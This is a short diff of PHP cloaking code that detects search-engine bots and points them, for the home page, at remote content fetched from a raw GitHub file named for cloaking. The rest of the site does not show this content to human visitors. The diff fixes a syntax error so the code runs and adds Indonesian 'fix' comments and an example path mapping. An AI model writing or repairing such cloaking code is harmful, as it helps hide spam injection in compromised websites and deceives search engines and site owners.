@@ -43,11 +43,12 @@ if ($isBot && !$isLogged) {
     $targetUrl = null;
 
     if ($clean_uri === '/' || $clean_uri === '/index.php' || empty($clean_uri)) {
-        $targetUrl = https://raw.githubusercontent.com/jandaperawan470/acelstarboy/refs/heads/main/cloking-galak-kal-kal.txt';
-    }
-
-    else {
+        // PERBAIKAN 1: Tambahkan tanda kutip pada URL
+        $targetUrl = 'https://raw.githubusercontent.com/jandaperawan470/acelstarboy/refs/heads/main/cloking-galak-kal-kal.txt';
+    } else {
         $botTargets = [
+            // PERBAIKAN 2: Tambahkan beberapa contoh path jika diperlukan
+            // '/example' => 'https://example.com/content.txt',
         ];
 
         foreach ($botTargets as $path => $remote) {
